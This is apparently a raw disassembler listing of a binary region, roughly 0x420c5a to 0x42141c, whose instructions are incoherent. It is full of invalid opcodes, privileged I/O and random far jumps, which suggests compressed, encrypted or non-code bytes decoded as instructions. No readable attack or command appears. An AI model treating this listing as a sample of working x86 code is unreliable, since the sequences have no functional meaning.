  420c5a:	in     eax,0xc1
  420c5c:	stos   BYTE PTR es:[edi],al
  420c5d:	and    eax,0xb03d573e
  420c62:	add    BYTE PTR [edi-0x4d4273db],al
  420c68:	push   es
  420c69:	mov    esi,0xd7154f9f
  420c6e:	dec    ecx
  420c6f:	ins    BYTE PTR es:[edi],dx
  420c70:	and    BYTE PTR [esi-0x12a6a76b],0x4
  420c77:	mov    edx,0x40518824
  420c7c:	lods   eax,DWORD PTR ds:[esi]
  420c7d:	lds    esp,FWORD PTR [ecx]
  420c7f:	retf   
  420c80:	cmp    al,0xfa
  420c82:	cmp    edx,DWORD PTR [eax-0x7cc60436]
  420c88:	mov    ch,0x11
  420c8a:	stos   BYTE PTR es:[edi],al
  420c8b:	in     al,0x1c
  420c8d:	inc    esp
  420c8e:	sub    BYTE PTR [edi],dl
  420c90:	push   0xcc2e0692
  420c95:	adc    dh,BYTE PTR [ecx]
  420c97:	ffree  st(1)
  420c99:	inc    edi
  420c9a:	mov    ds:0x41400cbb,eax
  420c9f:	add    dh,al
  420ca1:	push   0xb1908494
  420ca6:	mov    ebx,0xc2697ca8
  420cab:	fisttp DWORD PTR [eax]
  420cad:	jg     0x420c4e
  420caf:	in     eax,dx
  420cb0:	sub    eax,0xb24b4b91
  420cb5:	mov    WORD PTR [eax],ss
  420cb7:	ret    
  420cb8:	clc    
  420cb9:	hlt    
  420cba:	sahf   
  420cbb:	in     al,dx
  420cbc:	pop    DWORD PTR [ebx-0x32]
  420cbf:	push   ds
  420cc0:	mov    edi,0x54883122
  420cc5:	sbb    bl,0xf5
  420cc8:	jecxz  0x420cc0
  420cca:	arpl   WORD PTR [esi+edi*2],dx
  420ccd:	cmp    al,0x39
  420ccf:	push   ss
  420cd0:	ret    0xe60a
  420cd3:	jecxz  0x420cad
  420cd5:	dec    ecx
  420cd6:	and    al,0x82
  420cd8:	icebp  
  420cd9:	cmp    bl,BYTE PTR [ebx+edi*1]
  420cdc:	repz cdq 
  420cde:	pop    ds
  420cdf:	inc    ecx
  420ce0:	sub    edx,DWORD PTR [ecx+0x35]
  420ce3:	add    eax,0xf4a5f8fa
  420ce8:	jo     0x420ca4
  420cea:	or     DWORD PTR [edx+0x63],esp
  420ced:	cwde   
  420cee:	fdivr  QWORD PTR [ebx-0x3e722210]
  420cf4:	or     eax,0xc7651bf2
  420cf9:	pop    ecx
  420cfa:	pop    es
  420cfb:	push   ebx
  420cfc:	pop    esp
  420cfd:	icebp  
  420cfe:	call   0x6e017147
  420d03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d04:	xor    BYTE PTR [eax-0x47],cl
  420d07:	int    0x4a
  420d09:	ins    DWORD PTR es:[edi],dx
  420d0a:	fidiv  DWORD PTR [ecx+0x7]
  420d0d:	mov    ah,0x3a
  420d0f:	jmp    0x97b0:0x30c981d0
  420d16:	pop    eax
  420d17:	(bad)  
  420d18:	cmp    ah,BYTE PTR [esi+0x79bda64c]
  420d1e:	xchg   esi,eax
  420d1f:	or     DWORD PTR [ecx],0x5d
  420d22:	sar    BYTE PTR [edx+0x655652a0],1
  420d28:	sub    dh,BYTE PTR [ebx+0x5d0d3b6c]
  420d2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d2f:	cmc    
  420d30:	mov    eax,DWORD PTR [ebx+eax*2+0x5223e9e1]
  420d37:	inc    esi
  420d38:	fs push ecx
  420d3a:	hlt    
  420d3b:	cli    
  420d3c:	(bad)  
  420d3d:	aaa    
  420d3e:	push   ecx
  420d3f:	lods   eax,DWORD PTR ds:[esi]
  420d40:	push   edx
  420d41:	xchg   esp,eax
  420d42:	lods   al,BYTE PTR ds:[esi]
  420d43:	adc    cl,BYTE PTR [esi-0x71]
  420d46:	jmp    0x420d0b
  420d48:	shl    BYTE PTR [ebp+0x3a],1
  420d4b:	and    DWORD PTR [esi-0x3e],edi
  420d4e:	or     BYTE PTR [ebx+eiz*4+0x3960e6fe],cl
  420d55:	in     al,dx
  420d56:	pop    ecx
  420d57:	outs   dx,DWORD PTR ds:[esi]
  420d58:	pop    edi
  420d59:	dec    esp
  420d5a:	das    
  420d5b:	fwait
  420d5c:	push   ebx
  420d5d:	xchg   esp,eax
  420d5e:	add    DWORD PTR [ebx],eax
  420d60:	in     al,dx
  420d61:	(bad)  
  420d62:	ret    
  420d63:	fidivr WORD PTR [eax-0x2fcfb01b]
  420d69:	and    eax,0x24843494
  420d6e:	imul   eax,DWORD PTR [eax],0xffffffd9
  420d71:	je     0x420d10
  420d73:	sub    edi,DWORD PTR [edi+0x15]
  420d76:	in     al,0xbd
  420d78:	mov    ecx,0xa1b10605
  420d7d:	call   0x8c48:0x64a5b517
  420d84:	mov    cl,0x96
  420d86:	lds    eax,FWORD PTR [ebx-0x24]
  420d89:	popf   
  420d8a:	cwde   
  420d8b:	mov    dh,0xd7
  420d8d:	dec    edi
  420d8e:	xchg   ecx,eax
  420d8f:	cmp    eax,0x83bfd33c
  420d94:	les    ebx,FWORD PTR [ebp+0x42b4bd8]
  420d9a:	xchg   BYTE PTR ds:0x6ff74479,cl
  420da0:	dec    ebx
  420da1:	pop    ss
  420da2:	dec    edi
  420da3:	outs   dx,BYTE PTR ds:[esi]
  420da4:	cmp    dh,BYTE PTR [edx+edi*1]
  420da7:	push   es
  420da8:	mov    edx,0x3de585fc
  420dad:	jb     0x420d30
  420daf:	adc    eax,0x481287f0
  420db4:	dec    ebx
  420db5:	cs out dx,al
  420db7:	sbb    DWORD PTR [ebx],ebp
  420db9:	rol    DWORD PTR [esi-0x381e6a3e],1
  420dbf:	dec    esp
  420dc0:	lods   eax,DWORD PTR ds:[esi]
  420dc1:	ins    DWORD PTR es:[edi],dx
  420dc2:	rol    esp,cl
  420dc4:	pop    esp
  420dc5:	sub    al,0x34
  420dc7:	mov    edi,0x1829be0
  420dcc:	push   0x71
  420dce:	enter  0xd2da,0xce
  420dd2:	fistp  WORD PTR [ebx+0x65c25bf7]
  420dd8:	sub    edx,DWORD PTR [ebx-0x25]
  420ddb:	out    0xa1,al
  420ddd:	mov    bh,0x68
  420ddf:	int3   
  420de0:	cli    
  420de1:	cmp    edx,DWORD PTR [ebx+0x15]
  420de4:	jmp    0x498f:0xc44ab49f
  420deb:	cmp    al,0x80
  420ded:	add    eax,0x74ab81e9
  420df2:	pop    ds
  420df3:	mov    esp,0xc5976a59
  420df8:	sub    ch,BYTE PTR [eax-0x23]
  420dfb:	pop    edx
  420dfc:	lahf   
  420dfd:	sub    eax,0xec45e04f
  420e02:	lods   al,BYTE PTR ds:[esi]
  420e03:	cmc    
  420e04:	popa   
  420e05:	jns    0x420e23
  420e07:	sar    DWORD PTR [eax],cl
  420e09:	jbe    0x420da1
  420e0b:	sahf   
  420e0c:	jg     0x420def
  420e0e:	call   0xff23:0x18cf8a76
  420e15:	or     ecx,DWORD PTR [eax-0x2a0004a]
  420e1b:	and    ebp,DWORD PTR [edx+0xeeec4e]
  420e21:	punpckldq mm7,DWORD PTR [esp+edi*1+0x37]
  420e26:	aas    
  420e27:	sbb    BYTE PTR [ecx-0xeb59c14],0x8c
  420e2e:	std    
  420e2f:	sbb    BYTE PTR [ebp+ebx*1+0x7b],dl
  420e33:	mov    ah,0x7b
  420e35:	lds    ecx,FWORD PTR [ebx]
  420e37:	aaa    
  420e38:	retf   
  420e39:	sbb    ebx,esp
  420e3b:	out    dx,al
  420e3c:	aaa    
  420e3d:	in     al,0x86
  420e3f:	and    edi,DWORD PTR [edi+0x3ef71d56]
  420e45:	or     ebx,0x9e8a9acc
  420e4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e4c:	jb     0x420e00
  420e4e:	push   esp
  420e4f:	bound  ebp,QWORD PTR [edx+0x3cfaeff]
  420e55:	mov    WORD PTR [ebp+0xb59b4e6],fs
  420e5b:	mov    dl,0xff
  420e5d:	fstp   QWORD PTR [esi]
  420e5f:	add    bh,bl
  420e61:	enter  0x5f4e,0xac
  420e65:	popf   
  420e66:	jl     0x420dea
  420e68:	jae    0x420df8
  420e6a:	das    
  420e6b:	mov    ebp,0xf1136806
  420e70:	imul   esi,DWORD PTR [edx],0x6
  420e73:	(bad)  
  420e74:	shl    BYTE PTR [esi-0x443e0543],cl
  420e7a:	enter  0x54ca,0xc
  420e7e:	xor    BYTE PTR [edi],0x5a
  420e81:	js     0x420e50
  420e83:	and    al,0xa1
  420e85:	sub    al,BYTE PTR [ecx-0x58]
  420e88:	xlat   BYTE PTR ds:[ebx]
  420e89:	lea    edx,[edi+0x45]
  420e8c:	or     BYTE PTR [eax+0x4e],bh
  420e8f:	inc    DWORD PTR ds:0xbc03f9e2
  420e95:	push   ebp
  420e96:	enter  0x6a12,0xe1
  420e9a:	sahf   
  420e9b:	fstp   DWORD PTR [ebx]
  420e9d:	loop   0x420e46
  420e9f:	or     DWORD PTR [ebx-0x622aa876],edx
  420ea5:	sbb    al,0xc3
  420ea7:	lock cmp BYTE PTR [edi+0x66],cl
  420eab:	and    al,BYTE PTR [ecx+0x21]
  420eae:	jle    0x420ebf
  420eb0:	cmp    esp,ebp
  420eb2:	cmp    dh,ah
  420eb4:	push   edi
  420eb5:	push   edi
  420eb6:	mov    ds:0x4f2ae9d1,al
  420ebb:	(bad)  
  420ebc:	pushf  
  420ebd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ebe:	out    dx,eax
  420ebf:	test   DWORD PTR [ecx+eax*8-0x45],esp
  420ec3:	jecxz  0x420f17
  420ec5:	jl     0x420e7a
  420ec7:	inc    ebp
  420ec8:	adc    DWORD PTR [edx-0x29],ecx
  420ecb:	pushf  
  420ecc:	and    eax,0xdbe53694
  420ed1:	daa    
  420ed2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ed3:	mov    ?,esi
  420ed5:	fnstsw WORD PTR ds:0x1e58c0ab
  420edb:	int    0xe8
  420edd:	mov    dh,0x2d
  420edf:	sbb    esp,DWORD PTR [edi-0x13e4f617]
  420ee5:	lds    ebx,FWORD PTR [edx]
  420ee7:	dec    ecx
  420ee8:	xchg   edi,eax
  420ee9:	push   esi
  420eea:	xchg   edx,eax
  420eeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420eec:	outs   dx,DWORD PTR ds:[esi]
  420eed:	mov    ch,0xb9
  420eef:	inc    ecx
  420ef0:	cmp    cl,ch
  420ef2:	mov    cl,0xe0
  420ef4:	mov    edi,0x8120f7b5
  420ef9:	cmp    edx,edx
  420efb:	mov    ds:0x5e25d092,al
  420f00:	fidiv  DWORD PTR [ebx+0x7bdba25]
  420f06:	xlat   BYTE PTR ds:[ebx]
  420f07:	add    eax,0xf415da0d
  420f0c:	xor    eax,0x7a98ea7f
  420f11:	mov    dh,0xd1
  420f13:	out    0xe0,eax
  420f15:	sahf   
  420f16:	inc    edx
  420f17:	mov    esi,0xd049f85
  420f1c:	cmp    BYTE PTR [esi+0x1],ah
  420f1f:	push   ebx
  420f20:	scas   eax,DWORD PTR es:[edi]
  420f21:	lock imul esp,DWORD PTR [ecx+eiz*1],0x7a
  420f26:	cld    
  420f27:	fadd   st,st(5)
  420f29:	loope  0x420eba
  420f2b:	(bad)  [edx-0x24]
  420f2e:	jg     0x420ec4
  420f30:	sbb    eax,0xa1c7772d
  420f35:	mov    dl,0x42
  420f37:	data16 (bad) 
  420f39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f3a:	inc    esi
  420f3b:	aaa    
  420f3c:	adc    cl,dh
  420f3e:	ret    
  420f3f:	(bad)  
  420f40:	sub    al,0x51
  420f42:	adc    BYTE PTR [eax+ebx*4+0x22],0x5
  420f47:	xchg   ecx,eax
  420f48:	or     BYTE PTR [ebp-0x1],ah
  420f4b:	or     al,0x9b
  420f4d:	imul   ebp,DWORD PTR [ebp-0x7d],0xffffffc0
  420f51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f52:	fild   WORD PTR [ecx+ebx*2+0x3fd9432d]
  420f59:	js     0x420f37
  420f5b:	sbb    eax,0xf5e3dd90
  420f60:	(bad)  
  420f61:	loop   0x420fc3
  420f63:	dec    ebp
  420f64:	gs sbb bh,ch
  420f67:	and    edx,DWORD PTR [edx+0x5cd39215]
  420f6d:	sbb    DWORD PTR [edx+0x3f],esi
  420f70:	jo     0x420f6d
  420f72:	push   edx
  420f73:	ds ret 0xd200
  420f77:	mov    eax,ds:0xafd1d02d
  420f7c:	jnp    0x420f73
  420f7e:	out    0x89,eax
  420f80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f81:	sub    esi,DWORD PTR [eax]
  420f83:	ret    
  420f84:	ja     0x420fe7
  420f86:	adc    al,0x82
  420f88:	inc    edi
  420f89:	enter  0x3520,0xb2
  420f8d:	mov    edx,0x7e8f5341
  420f92:	xchg   DWORD PTR [edi-0x6d],ebx
  420f95:	loop   0x420f18
  420f97:	sti    
  420f98:	bound  eax,QWORD PTR [ebx-0x3a]
  420f9b:	add    ah,BYTE PTR [edx+0x6d079f79]
  420fa1:	mov    bh,0xa8
  420fa3:	lea    esp,[ebx]
  420fa5:	xor    al,0x7d
  420fa7:	cdq    
  420fa8:	cwde   
  420fa9:	jae    0x420f5e
  420fab:	daa    
  420fac:	or     al,0xc2
  420fae:	jo     0x420f49
  420fb0:	and    edi,DWORD PTR [ebx+eiz*8+0x65a60dfa]
  420fb7:	(bad)  
  420fb8:	outs   dx,DWORD PTR ds:[esi]
  420fb9:	(bad)  
  420fba:	js     0x420f4e
  420fbc:	imul   eax,DWORD PTR [edi],0x5d
  420fbf:	push   ebx
  420fc0:	add    ebx,ecx
  420fc2:	jl     0x420fd6
  420fc4:	mov    dh,0xec
  420fc6:	ds loopne 0x420fb2
  420fc9:	xchg   eax,edx
  420fcb:	outs   dx,BYTE PTR ds:[esi]
  420fcc:	inc    ebp
  420fcd:	pop    edx
  420fce:	inc    ebx
  420fcf:	xchg   ebp,eax
  420fd0:	sbb    DWORD PTR [ecx+ebx*2+0xec92439],edi
  420fd7:	rol    DWORD PTR [ebp-0x16c7a257],cl
  420fdd:	loop   0x42105a
  420fdf:	sub    ebp,DWORD PTR [edi+esi*2]
  420fe2:	outs   dx,DWORD PTR ds:[esi]
  420fe3:	cld    
  420fe4:	cmp    al,0xb9
  420fe6:	ret    0x4d16
  420fe9:	(bad)  
  420fea:	ror    BYTE PTR [ebp+edi*8+0x9],0x26
  420fef:	clc    
  420ff0:	mov    ebp,0xd5f9ec91
  420ff5:	push   ebp
  420ff6:	pop    ecx
  420ff7:	mov    esp,0x2b332645
  420ffc:	add    DWORD PTR [edx+ecx*2],edx
  420fff:	cmp    al,0xa
  421001:	je     0x420fd7
  421003:	out    0x93,eax
  421005:	mov    cl,0x69
  421007:	ss aaa 
  421009:	mov    ebp,0xcea79836
  42100e:	xchg   esp,eax
  42100f:	scas   eax,DWORD PTR es:[edi]
  421010:	in     eax,0x99
  421012:	add    ebp,DWORD PTR [esi]
  421014:	inc    ebp
  421015:	stos   DWORD PTR es:[edi],eax
  421016:	jge    0x420fc5
  421018:	int3   
  421019:	repnz adc BYTE PTR [eax-0x1c41d021],bl
  421020:	push   0x17d0e17b
  421025:	shl    BYTE PTR [edi+0x76],1
  421028:	jae    0x421044
  42102a:	mov    ah,dh
  42102c:	out    0x7d,al
  42102e:	ret    0x444
  421031:	mov    esi,0x216af42e
  421036:	push   ebx
  421037:	lds    esp,FWORD PTR [eax+edi*8-0x5f]
  42103b:	pop    ebx
  42103c:	inc    edx
  42103d:	xchg   esi,eax
  42103e:	cmp    BYTE PTR [ebx],0x26
  421041:	push   cs
  421042:	jb     0x421048
  421044:	loope  0x420ff1
  421046:	or     edx,DWORD PTR [edx]
  421048:	scas   eax,DWORD PTR es:[edi]
  421049:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42104a:	pusha  
  42104b:	mov    BYTE PTR [ebx+0x4e7b9a65],al
  421051:	ds repnz int 0x9e
  421055:	mov    WORD PTR [ecx+edx*4],gs
  421058:	call   0x3c6e66f7
  42105d:	pop    esi
  42105e:	cdq    
  42105f:	icebp  
  421060:	lea    edx,[eax]
  421062:	inc    eax
  421063:	pop    es
  421064:	push   ds
  421065:	cmp    eax,0x4dbfcb13
  42106a:	xor    esp,0x583c40fe
  421070:	sar    BYTE PTR [ecx],cl
  421072:	jno    0x42104b
  421074:	ror    ch,0xfe
  421077:	adc    BYTE PTR [eax-0x13],bl
  42107a:	xchg   ecx,eax
  42107b:	pop    es
  42107c:	cs (bad) 
  42107e:	pop    esi
  42107f:	and    eax,0x4343f036
  421084:	nop
  421085:	shl    DWORD PTR ds:0x89a8f5a2,0xbd
  42108c:	jmp    0xc33f:0x20955554
  421093:	out    dx,al
  421094:	jb     0x421106
  421096:	push   0x2ca44eba
  42109b:	push   esi
  42109c:	fld    QWORD PTR [ebp+0x67]
  42109f:	(bad)  
  4210a1:	out    0x6c,al
  4210a3:	ror    DWORD PTR [ebx-0x3a9b893e],1
  4210a9:	daa    
  4210aa:	jb     0x4210ba
  4210ac:	and    DWORD PTR [edx+ebx*1+0x41],esi
  4210b0:	aaa    
  4210b1:	sahf   
  4210b2:	xchg   esi,eax
  4210b3:	jae    0x42108b
  4210b5:	out    dx,al
  4210b6:	mov    bl,0xbd
  4210b8:	jmp    FWORD PTR [esi+ebx*1]
  4210bb:	mov    DWORD PTR [edi-0x23],edx
  4210be:	cmp    DWORD PTR [ecx],0xb3e164e8
  4210c4:	mov    bh,0x6e
  4210c6:	add    eax,0x38c3e459
  4210cb:	fnstsw WORD PTR [edx-0x3ab317e5]
  4210d1:	add    ebx,DWORD PTR [ebp-0x634a7032]
  4210d7:	sbb    DWORD PTR ds:0x5e76f7a,edi
  4210dd:	mov    ah,0x90
  4210df:	stos   BYTE PTR es:[edi],al
  4210e0:	inc    ebp
  4210e1:	mov    eax,DWORD PTR [esi+ebx*2+0x703e55eb]
  4210e8:	add    BYTE PTR [eax-0x3a],dh
  4210eb:	mov    ah,0x74
  4210ed:	jb     0x421099
  4210ef:	jbe    0x4210c8
  4210f1:	push   es
  4210f2:	shl    BYTE PTR [esi-0x42],cl
  4210f5:	loopne 0x4210fb
  4210f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4210f8:	jbe    0x421107
  4210fa:	aaa    
  4210fb:	sub    BYTE PTR [ebx-0x4],cl
  4210fe:	push   esp
  4210ff:	adc    ch,dl
  421101:	fwait
  421102:	jmp    0xfb49:0xff7c3c31
  421109:	xor    bh,BYTE PTR [edx+0x25]
  42110c:	mov    eax,esp
  42110e:	mov    esp,0xd5ee6aba
  421113:	mov    ecx,0x55712f78
  421118:	xor    DWORD PTR [ebp-0x2a],ebp
  42111b:	jns    0x421148
  42111d:	xor    eax,0xb148190e
  421122:	sbb    al,0xf5
  421124:	and    DWORD PTR [edx-0x5f5d82d5],ecx
  42112a:	mov    eax,?
  42112c:	enter  0xfd05,0xab
  421130:	push   esi
  421131:	mov    esp,0x96adb6f2
  421136:	ins    DWORD PTR es:[edi],dx
  421137:	aad    0x38
  421139:	mov    BYTE PTR ds:0xc641de39,cl
  42113f:	in     eax,dx
  421140:	icebp  
  421141:	sbb    eax,0xe414ae12
  421146:	in     eax,0x7c
  421148:	call   0xc873:0x2011819
  42114f:	retf   
  421150:	mov    bh,0x1
  421152:	nop
  421153:	or     BYTE PTR [edi+0x53],dl
  421156:	ins    DWORD PTR es:[edi],dx
  421157:	mov    bh,0x2e
  421159:	xchg   esp,eax
  42115a:	call   0x78ec:0xb143191d
  421161:	mov    al,ds:0xd9a18af2
  421166:	popa   
  421167:	xor    al,0xe0
  421169:	jmp    0x421170
  42116b:	loop   0x421177
  42116d:	das    
  42116e:	xchg   esp,eax
  42116f:	(bad)  
  421170:	pop    eax
  421171:	fnstsw WORD PTR [eax+edi*4-0x4dee27b2]
  421178:	mov    ds:0x432dd37c,eax
  42117d:	stos   DWORD PTR es:[edi],eax
  42117e:	repnz and al,0xa6
  421181:	and    eax,0x8ee1e979
  421186:	rol    DWORD PTR [ebx-0x7aa2d463],cl
  42118c:	clc    
  42118d:	adc    eax,0xc65698b2
  421192:	pop    eax
  421193:	out    0x6c,eax
  421195:	mov    ch,BYTE PTR [eax+0x13]
  421198:	and    eax,0x9780443c
  42119d:	xchg   ebp,eax
  42119e:	sbb    bh,BYTE PTR [edx+edi*1-0x56bac123]
  4211a5:	fldcw  WORD PTR [ebp-0x729cd7fb]
  4211ab:	or     eax,0x8ae9cf33
  4211b0:	push   esp
  4211b1:	fistp  DWORD PTR [esi-0x9]
  4211b4:	ret    0xe5e5
  4211b7:	inc    ebx
  4211b8:	(bad)  
  4211b9:	stc    
  4211ba:	mov    eax,ds:0x8a809b94
  4211bf:	pop    esp
  4211c0:	pushf  
  4211c1:	jnp    0x421151
  4211c3:	mov    al,BYTE PTR [eax]
  4211c5:	sub    al,0x39
  4211c7:	adc    ebp,DWORD PTR [ebx+0x72]
  4211ca:	fsubp  st(4),st
  4211cc:	fmul   DWORD PTR [ebx]
  4211ce:	add    DWORD PTR [eax+eiz*2+0x72],esi
  4211d2:	out    dx,al
  4211d3:	retf   0x54aa
  4211d6:	int3   
  4211d7:	fist   DWORD PTR [edi]
  4211d9:	xchg   ah,ah
  4211db:	in     al,dx
  4211dc:	add    ah,0x2f
  4211df:	add    BYTE PTR [ebp+ebp*4-0x4c],0x92
  4211e4:	aaa    
  4211e5:	fdiv   QWORD PTR [eax+0xda2ae32]
  4211eb:	xor    eax,0x175996c5
  4211f0:	hlt    
  4211f1:	fisttp WORD PTR [ecx]
  4211f3:	retw   
  4211f5:	popa   
  4211f6:	sub    ah,ch
  4211f8:	xor    al,0x7a
  4211fa:	xor    DWORD PTR [edx],esi
  4211fc:	aas    
  4211fd:	inc    edx
  4211fe:	shl    BYTE PTR [ecx-0x68],cl
  421201:	pop    esp
  421202:	(bad)  
  421203:	inc    edx
  421204:	mov    ds:0x70bc366d,eax
  421209:	popa   
  42120a:	je     0x42119e
  42120c:	loope  0x421267
  42120e:	icebp  
  42120f:	test   al,0xfa
  421211:	xlat   BYTE PTR ds:[ebx]
  421212:	test   BYTE PTR [bx-0x2eb2],bh
  421217:	sbb    DWORD PTR ds:0x18cda5dc,eax
  42121d:	jnp    0x421235
  42121f:	imul   esi,DWORD PTR [ebx],0x6959cf52
  421225:	push   edi
  421226:	sub    edi,DWORD PTR fs:[ebx+0x4a345068]
  42122d:	xchg   DWORD PTR ds:0xe953a72a,esp
  421233:	std    
  421234:	nop
  421235:	cmc    
  421236:	int    0xea
  421238:	adc    al,0x5a
  42123a:	dec    ebp
  42123b:	lea    ecx,gs:[ebx+0x7f]
  42123f:	jne    0x421269
  421241:	es jo  0x42129f
  421244:	xchg   BYTE PTR [ecx],bl
  421246:	test   eax,0x32dffafc
  42124b:	dec    ecx
  42124c:	or     eax,0x97913474
  421251:	xor    BYTE PTR [ebx-0x72aa81af],al
  421257:	xchg   ebp,eax
  421258:	inc    eax
  421259:	jle    0x42122d
  42125b:	push   edx
  42125c:	xor    al,0x95
  42125e:	adc    BYTE PTR [ebp+ebp*1-0x7b],bl
  421262:	pop    esp
  421263:	test   eax,0x6800dd2e
  421268:	stos   BYTE PTR es:[edi],al
  421269:	out    dx,eax
  42126a:	xor    esi,esp
  42126c:	mov    ecx,DWORD PTR [ecx+0x11b4ec7]
  421272:	cmp    dh,BYTE PTR [ebp+0x2023b636]
  421278:	mov    eax,ds:0xbdaf1c
  42127d:	jl     0x421244
  42127f:	aad    0x79
  421281:	cmp    esp,DWORD PTR [esp+ebp*8+0x3fb3eebc]
  421288:	lock or eax,0xa3c2c0
  42128e:	popa   
  42128f:	sahf   
  421290:	adc    al,0xc8
  421292:	cmp    cl,BYTE PTR [ecx-0x4f]
  421295:	imul   ebp,DWORD PTR [edx],0xffffffc5
  421298:	push   ecx
  421299:	xor    DWORD PTR [esi],eax
  42129b:	mov    edi,esp
  42129d:	ins    BYTE PTR es:[edi],dx
  42129e:	jp     0x42125d
  4212a0:	pop    es
  4212a1:	rol    ebp,cl
  4212a3:	scas   eax,DWORD PTR es:[edi]
  4212a4:	in     al,dx
  4212a5:	cmc    
  4212a6:	addr16 add al,0x9f
  4212a9:	sbb    esp,DWORD PTR [edi]
  4212ab:	data16 mov bh,0x66
  4212ae:	clc    
  4212af:	lds    edx,FWORD PTR [ebx-0x5e6fdf70]
  4212b5:	adc    cl,BYTE PTR [edx+0x435ddc49]
  4212bb:	out    dx,eax
  4212bc:	cmp    ecx,DWORD PTR [edx-0xe]
  4212bf:	sbb    BYTE PTR [edx+0x5b258122],ch
  4212c5:	lds    esp,FWORD PTR [edx-0x48]
  4212c8:	aam    0xb3
  4212ca:	call   0xb610:0xeaf8454a
  4212d1:	les    edi,FWORD PTR [eax]
  4212d3:	jo     0x4212d4
  4212d5:	ins    DWORD PTR es:[edi],dx
  4212d6:	imul   ebx,DWORD PTR [ebp-0x4f],0x15e88551
  4212dd:	jl     0x4212f8
  4212df:	jno    0x4212bb
  4212e1:	imul   edi,DWORD PTR [esi+0x27],0xa7a008d0
  4212e8:	js     0x4212d6
  4212ea:	xchg   ecx,eax
  4212eb:	push   ss
  4212ec:	mov    bl,0x1
  4212ee:	mov    cl,0x79
  4212f0:	mov    ebx,0xb331e560
  4212f5:	dec    ebx
  4212f6:	ja     0x4212e8
  4212f8:	pop    ds
  4212f9:	or     al,0x74
  4212fb:	add    bh,bh
  4212fd:	aaa    
  4212fe:	inc    esp
  4212ff:	loope  0x421337
  421301:	add    eax,0x9aa69bff
  421306:	cmc    
  421307:	fwait
  421308:	or     al,0xb0
  42130a:	(bad)  
  42130b:	and    al,ch
  42130d:	mov    edi,0x626f7558
  421312:	xchg   BYTE PTR [esi-0x6e],al
  421315:	cwde   
  421316:	add    cl,dh
  421318:	xchg   esp,eax
  421319:	adc    edx,0xaee9b05
  42131f:	into   
  421320:	fst    QWORD PTR [ebp-0x1]
  421323:	mov    cs,WORD PTR [edi-0x69b6ba2c]
  421329:	cmp    DWORD PTR [ecx],0xef867f01
  42132f:	test   BYTE PTR [eax],cl
  421331:	or     ecx,eax
  421333:	fld    DWORD PTR [ecx]
  421335:	mov    dl,0xda
  421337:	pop    ss
  421338:	cmp    dl,BYTE PTR [eax+0x24]
  42133b:	xchg   DWORD PTR [esi+ebp*4-0x69a7a3ae],ebp
  421342:	arpl   di,bx
  421344:	jmp    FWORD PTR [ebp-0x2554527c]
  42134a:	mov    dh,BYTE PTR [edi]
  42134c:	pop    edx
  42134d:	sub    al,0xb5
  42134f:	mov    ds:0xe935c345,al
  421354:	out    0x1,eax
  421356:	cmp    ch,BYTE PTR [esi-0x1c]
  421359:	iret   
  42135a:	das    
  42135b:	dec    ecx
  42135c:	sub    eax,0x568c728c
  421361:	je     0x421365
  421363:	int3   
  421364:	cmc    
  421365:	xchg   BYTE PTR [esi+0x3a],bl
  421368:	sbb    DWORD PTR [eax-0x7c],edi
  42136b:	repnz pop esp
  42136d:	xchg   ebx,eax
  42136e:	dec    esi
  42136f:	and    al,0x84
  421371:	add    dl,BYTE PTR [esi]
  421373:	mov    edx,0xd6995747
  421378:	out    dx,eax
  421379:	sbb    al,0x16
  42137b:	jmp    0xcb826a80
  421380:	ja     0x421398
  421382:	dec    eax
  421383:	call   0x7c219cf2
  421388:	jae    0x421353
  42138a:	popa   
  42138b:	hlt    
  42138c:	push   ds
  42138d:	daa    
  42138e:	in     al,0x4c
  421390:	fstp   QWORD PTR [edx]
  421392:	xor    dl,cl
  421394:	loopne 0x42138c
  421396:	js     0x421332
  421398:	push   ebp
  421399:	push   esi
  42139a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42139b:	loope  0x4213e8
  42139d:	fldenv [ecx-0x55]
  4213a0:	mov    eax,0x34b418ba
  4213a5:	lods   eax,DWORD PTR ds:[esi]
  4213a6:	jbe    0x42133b
  4213a8:	and    DWORD PTR [ebx+eiz*4],ebp
  4213ab:	aam    0x9
  4213ad:	push   cs
  4213ae:	jae    0x421404
  4213b0:	es inc esi
  4213b2:	pop    ebp
  4213b3:	inc    edx
  4213b4:	ds jbe 0x42133c
  4213b7:	xchg   DWORD PTR [edx-0x20f9b13d],esi
  4213bd:	lea    edi,[edx+0x58]
  4213c0:	mov    cl,0x8d
  4213c2:	push   cs
  4213c3:	adc    bh,BYTE PTR [esi-0xa]
  4213c6:	das    
  4213c7:	push   ds
  4213c8:	push   edx
  4213c9:	cdq    
  4213ca:	ins    BYTE PTR es:[edi],dx
  4213cb:	or     eax,0x26dd2b7f
  4213d0:	sub    eax,0x7909714d
  4213d5:	repnz ins BYTE PTR es:[edi],dx
  4213d7:	in     al,dx
  4213d8:	arpl   WORD PTR [ebx+0x30],si
  4213db:	cli    
  4213dc:	ret    0x1cd4
  4213df:	mov    ebp,0x15b6c4fc
  4213e4:	push   ebp
  4213e5:	jmp    0x80b0812c
  4213ea:	dec    ebp
  4213eb:	push   eax
  4213ec:	adc    al,BYTE PTR [esi]
  4213ee:	mov    al,ds:0x57433d27
  4213f3:	ret    
  4213f4:	xor    BYTE PTR [edi],0xe4
  4213f7:	pusha  
  4213f8:	cdq    
  4213f9:	sub    ebp,esi
  4213fb:	mov    DWORD PTR [ebp+0x6a],eax
  4213fe:	cmp    BYTE PTR [ebx],dh
  421400:	(bad)  
  421401:	jmp    FWORD PTR [edi-0x10bdd344]
  421407:	fwait
  421408:	(bad)  
  421409:	sub    BYTE PTR [ebp+0xbfaa477],cl
  42140f:	fdiv   QWORD PTR [ecx+edx*2-0x52d6412b]
  421416:	leave  
  421417:	repz cmp al,0xa1
  42141a:	xchg   edx,eax
  42141b:	push   edi
  42141c:	or     eax,0x9344307e
